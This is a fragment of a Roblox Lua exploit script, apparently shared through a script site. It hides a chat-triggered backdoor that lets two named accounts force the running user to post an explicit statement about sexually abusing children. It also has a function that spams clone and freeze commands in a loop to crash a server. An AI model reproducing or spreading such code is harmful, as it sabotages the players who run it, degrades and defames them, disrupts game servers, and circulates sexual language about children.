...
v.Chatted:Connect(function(msg)
     ...
     task.spawn(function()
		...
		if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
	                 	Speak("i rape lil kids and i duck their little asshole so hard")
			end
                end
...
function FCrash()
      for i = 1,100 do
          Chat("clone all all all				duck")
          Chat("freeze all all all				duck")
      end
end
...
startupScripts()
		...
		game.Players.LocalPlayer:Kick("Use the loadstring on scriptblox. ") 
